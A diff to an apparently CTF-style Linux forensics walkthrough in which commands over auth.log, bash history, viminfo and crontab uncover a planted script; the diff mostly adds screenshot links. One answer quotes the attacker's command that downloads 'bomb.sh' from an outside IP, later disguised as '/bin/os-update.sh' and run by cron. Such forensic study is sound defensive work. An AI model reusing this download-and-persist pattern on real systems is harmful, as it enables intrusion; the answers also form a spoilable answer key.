@@ -19,6 +19,8 @@ cat /var/log/auth.log | grep "install"
 ```
 ![installed package](Task1_answer.png)
 
+
+
 > **Answer:** `/usr/bin/apt install dokuwiki`
 
 ---
@@ -29,6 +31,8 @@ cat /var/log/auth.log | grep "install"
 cat /var/log/auth.log | grep "install"
 ```
 ![installed package](Task1_answer.png)
+
+
 > **Answer:** `/home/cybert`
 
 ---
@@ -39,6 +43,8 @@ cat /var/log/auth.log | grep "install"
 cat /var/log/auth.log | grep "adduser"
 ```
 ![user added](task2_q1_answer.png)
+
+
 > **Answer:** `it-admin`
 
 ---
@@ -49,6 +55,8 @@ _Format: Month Day HH:MM:SS_
 ```bash
 cat /var/log/auth.log | grep "visudo"
 ```
+![sudo](task2_q2_answer.png)
+
 
 > **Answer:** `Dec 28 06:27:34`
 
@@ -59,6 +67,8 @@ cat /var/log/auth.log | grep "visudo"
 ```bash
 cat /var/log/auth.log | grep "vi"
 ```
+![scriptfile](task2_q3_answer.png)
+
 
 > **Answer:** `bomb.sh`
 
@@ -69,6 +79,7 @@ cat /var/log/auth.log | grep "vi"
 ```bash
 cat /home/it-admin/.bash_history
 ```
+![command](task3_q1_answer.png)
 
 > **Answer:** `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`
 
@@ -79,6 +90,8 @@ cat /home/it-admin/.bash_history
 ```bash
 cat /home/it-admin/.viminfo
 ```
+![rename](task3_q2_answer.png)
+
 
 > **Answer:** `/bin/os-update.sh`
 
@@ -90,6 +103,7 @@ _Format: Month Day HH:MM_
 ```bash
 ls -al --full-time /bin/os-update.sh
 ```
+![modified](task3_q3_answer.png)
 
 > **Answer:** `Dec 28 06:29`
 
@@ -101,6 +115,8 @@ ls -al --full-time /bin/os-update.sh
 cat /bin/os-update.sh
 ```
 
+![newfile](task3_q4_answer.png)
+
 > **Answer:** `goodbye.txt`
 
 ---
@@ -109,8 +125,9 @@ cat /bin/os-update.sh
 _Format: HH:MM AM/PM_
 
 ```bash
-crontab -l
+cat /etc/crontab
 ```
+![time](task4_q1_answer.png)
 
 > **Answer:** `08:00 AM`
 
